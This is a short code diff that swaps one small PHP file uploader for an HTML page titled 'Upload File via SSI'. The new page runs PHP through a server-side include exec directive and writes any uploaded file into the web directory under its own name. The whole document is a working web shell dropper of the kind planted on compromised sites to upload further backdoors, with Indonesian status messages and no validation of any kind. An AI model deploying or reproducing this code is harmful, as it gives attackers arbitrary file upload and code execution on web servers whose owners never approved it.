@@ -1,11 +1,30 @@
-<?php
-echo "<form method='post' enctype='multipart/form-data'>";
-echo "<input type='file' name='f'><input name='k' type='submit' id='k' value='upload'><br>";
-if (isset($_POST["k"]) && $_POST["k"] == "upload") {
-    if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
-        echo "<b>" . htmlspecialchars($_FILES["f"]["name"]) . " berhasil diupload.</b>";
-    } else {
-        echo "<b>Gagal upload Bjirr..</b>";
-    }
-}
-?>
+<html>
+<head>
+    <title>Upload File via SSI</title>
+    <link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave" rel="stylesheet">
+    <style>
+        body {
+            background-color: #FFB2D0;
+            color: black;
+            font-family: Sedgwick Ave;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <h1>Upload File</h1>
+    <!-- Form untuk mengunggah file -->
+    <form method="post" enctype="multipart/form-data">
+        <input type="file" name="f" required>
+        <input name="k" type="submit" id="k" value="upload">
+    </form>
+    <br>
+    <!-- Proses dan Tampilkan Hasil -->
+    <!--#exec cmd="php -r 'if ($_SERVER[\"REQUEST_METHOD\"] === \"POST\" && isset($_POST[\"k\"]) && $_POST[\"k\"] === \"upload\") { 
+        if (isset($_FILES[\"f\"]) && @copy($_FILES[\"f\"][\"tmp_name\"], $_FILES[\"f\"][\"name\"])) {
+            echo \"<b>\" . htmlspecialchars($_FILES[\"f\"][\"name\"]) . \" berhasil diupload.</b>\";
+        } else {
+            echo \"<b>Gagal upload Bjirr..</b>\";
+        }}'" -->
+</body>
+</html>
